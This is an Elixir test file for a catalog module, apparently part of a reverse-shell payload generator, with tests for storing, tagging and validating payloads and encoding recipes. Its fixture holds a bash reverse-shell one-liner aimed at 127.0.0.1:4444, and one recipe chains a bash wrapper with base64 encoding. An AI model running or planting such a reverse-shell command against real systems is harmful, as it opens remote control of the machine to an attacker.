defmodule Revkit.CatalogTest do
  use Revkit.DataCase, async: false

  alias Revkit.Catalog
  alias Revkit.Catalog.{Payload, Recipe, Tag}

  @payload_attrs %{
    name: "Bash TCP",
    template: "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
  }

  describe "payloads" do
    test "create_payload/1 persists a payload" do
      assert {:ok, %Payload{} = payload} = Catalog.create_payload(@payload_attrs)

      assert payload.name == "Bash TCP"
      assert payload.template == @payload_attrs.template
      assert payload.description == nil
      assert payload.recipe_id == nil
    end

    test "create_payload/1 validates required fields" do
      assert {:error, changeset} = Catalog.create_payload(%{})
      assert %{name: ["can't be blank"], template: ["can't be blank"]} = errors_on(changeset)
    end

    test "list_payloads/0 orders by name and preloads tags" do
      {:ok, _payload} = Catalog.create_payload(%{name: "Zeta", template: "z"})
      {:ok, payload} = Catalog.create_payload(%{name: "Alpha", template: "a"})
      {:ok, tag} = Catalog.create_tag(%{name: "unix"})
      {:ok, _payload} = Catalog.put_payload_tags(payload, [tag.id])

      payloads = Catalog.list_payloads()

      assert Enum.map(payloads, & &1.name) == ["Alpha", "Zeta"]
      assert Enum.all?(payloads, &Ecto.assoc_loaded?(&1.tags))
      assert hd(payloads).tags == [tag]
    end

    test "get_payload/1 and get_payload!/1 preload associations" do
      {:ok, payload} = Catalog.create_payload(@payload_attrs)

      assert Catalog.get_payload(payload.id).id == payload.id
      assert Ecto.assoc_loaded?(Catalog.get_payload!(payload.id).tags)
      assert Catalog.get_payload(-1) == nil
    end

    test "update_payload/2 updates a payload" do
      {:ok, payload} = Catalog.create_payload(@payload_attrs)

      assert {:ok, updated} = Catalog.update_payload(payload, %{name: "Renamed"})
      assert updated.name == "Renamed"
    end

    test "delete_payload/1 deletes a payload" do
      {:ok, payload} = Catalog.create_payload(@payload_attrs)

      assert {:ok, _payload} = Catalog.delete_payload(payload)
      assert Catalog.get_payload(payload.id) == nil
    end

    test "put_payload_tags/2 replaces the payload's tags" do
      {:ok, payload} = Catalog.create_payload(@payload_attrs)
      {:ok, unix} = Catalog.create_tag(%{name: "unix"})
      {:ok, linux} = Catalog.create_tag(%{name: "linux"})

      assert {:ok, tagged} = Catalog.put_payload_tags(payload, [unix.id, linux.id])
      assert tagged.tags |> Enum.map(& &1.name) |> Enum.sort() == ["linux", "unix"]

      assert {:ok, untagged} = Catalog.put_payload_tags(tagged, [])
      assert untagged.tags == []
    end

    test "put_payload_tags/2 rejects unknown tag ids" do
      {:ok, payload} = Catalog.create_payload(@payload_attrs)

      assert {:error, changeset} = Catalog.put_payload_tags(payload, [999_999])
      assert %{tags: ["reference unknown tags"]} = errors_on(changeset)
    end

    test "create_payload_with_tags/2 creates missing tags and reuses existing ones" do
      assert {:ok, payload} = Catalog.create_payload_with_tags(@payload_attrs, "unix, linux")

      assert payload.tags |> Enum.map(& &1.name) |> Enum.sort() == ["linux", "unix"]
      assert length(Catalog.list_tags()) == 2

      assert {:ok, other} =
               Catalog.create_payload_with_tags(%{name: "Other", template: "x"}, ["unix"])

      assert [%Tag{name: "unix"}] = other.tags
      assert length(Catalog.list_tags()) == 2
    end

    test "update_payload_with_tags/3 replaces tags and normalizes names" do
      {:ok, payload} = Catalog.create_payload_with_tags(@payload_attrs, ["unix"])

      assert {:ok, updated} =
               Catalog.update_payload_with_tags(payload, %{name: "Renamed"}, [
                 " linux ",
                 "",
                 "linux",
                 "web"
               ])

      assert updated.name == "Renamed"
      assert updated.tags |> Enum.map(& &1.name) |> Enum.sort() == ["linux", "web"]
    end

    test "create_payload_with_tags/2 rolls back the payload when a tag is invalid" do
      long_name = String.duplicate("a", 41)

      assert {:error, changeset} = Catalog.create_payload_with_tags(@payload_attrs, [long_name])
      assert %{name: [message]} = errors_on(changeset)
      assert message =~ "at most 40"

      assert Catalog.list_payloads() == []
      assert Catalog.list_tags() == []
    end
  end

  describe "recipes" do
    test "create_recipe/1 normalizes and stores ordered steps" do
      attrs = %{
        name: "Wrap then encode",
        steps: [
          %{key: :bash_wrapper, options: %{}},
          %{"key" => "base64_encode", "options" => %{padding: true}}
        ]
      }

      assert {:ok, %Recipe{} = recipe} = Catalog.create_recipe(attrs)

      assert recipe.steps == [
               %{"key" => "bash_wrapper", "options" => %{}},
               %{"key" => "base64_encode", "options" => %{"padding" => true}}
             ]

      assert Catalog.get_recipe!(recipe.id).steps == recipe.steps
    end

    test "create_recipe/1 defaults steps to an empty list" do
      assert {:ok, %Recipe{steps: []}} = Catalog.create_recipe(%{name: "Empty"})
    end

    test "create_recipe/1 rejects malformed steps" do
      assert {:error, changeset} =
               Catalog.create_recipe(%{name: "Bad", steps: [%{"key" => ""}]})

      assert %{steps: [message]} = errors_on(changeset)
      assert message =~ "options map"
    end

    test "list_recipes/0 orders by name" do
      {:ok, _recipe} = Catalog.create_recipe(%{name: "Zeta"})
      {:ok, _recipe} = Catalog.create_recipe(%{name: "Alpha"})

      assert Enum.map(Catalog.list_recipes(), & &1.name) == ["Alpha", "Zeta"]
    end

    test "update_recipe/2 and delete_recipe/1" do
      {:ok, recipe} = Catalog.create_recipe(%{name: "Original"})

      assert {:ok, updated} = Catalog.update_recipe(recipe, %{name: "Renamed"})
      assert updated.name == "Renamed"

      assert {:ok, _recipe} = Catalog.delete_recipe(updated)
      assert Catalog.get_recipe(recipe.id) == nil
    end

    test "delete_recipe/1 clears the recipe id on related payloads" do
      {:ok, recipe} = Catalog.create_recipe(%{name: "Recipe"})

      {:ok, payload} =
        Catalog.create_payload(Map.put(@payload_attrs, :recipe_id, recipe.id))

      assert payload.recipe_id == recipe.id

      assert {:ok, _recipe} = Catalog.delete_recipe(recipe)
      assert Catalog.get_payload!(payload.id).recipe_id == nil
    end
  end

  describe "tags" do
    test "create_tag/1 trims whitespace" do
      assert {:ok, %Tag{name: "unix"}} = Catalog.create_tag(%{name: "  unix  "})
    end

    test "create_tag/1 enforces unique names" do
      {:ok, _tag} = Catalog.create_tag(%{name: "unix"})

      assert {:error, changeset} = Catalog.create_tag(%{name: "unix"})
      assert %{name: ["has already been taken"]} = errors_on(changeset)
    end

    test "create_tag/1 validates the name" do
      assert {:error, changeset} = Catalog.create_tag(%{name: "   "})
      assert %{name: ["can't be blank"]} = errors_on(changeset)
    end

    test "list_tags/0 orders by name" do
      {:ok, _tag} = Catalog.create_tag(%{name: "zeta"})
      {:ok, _tag} = Catalog.create_tag(%{name: "alpha"})

      assert Enum.map(Catalog.list_tags(), & &1.name) == ["alpha", "zeta"]
    end

    test "delete_tag/1 removes the tag from payloads" do
      {:ok, payload} = Catalog.create_payload(@payload_attrs)
      {:ok, unix} = Catalog.create_tag(%{name: "unix"})
      {:ok, linux} = Catalog.create_tag(%{name: "linux"})
      {:ok, _payload} = Catalog.put_payload_tags(payload, [unix.id, linux.id])

      assert {:ok, _tag} = Catalog.delete_tag(unix)

      assert Catalog.get_payload!(payload.id).tags |> Enum.map(& &1.id) == [linux.id]
    end
  end
end
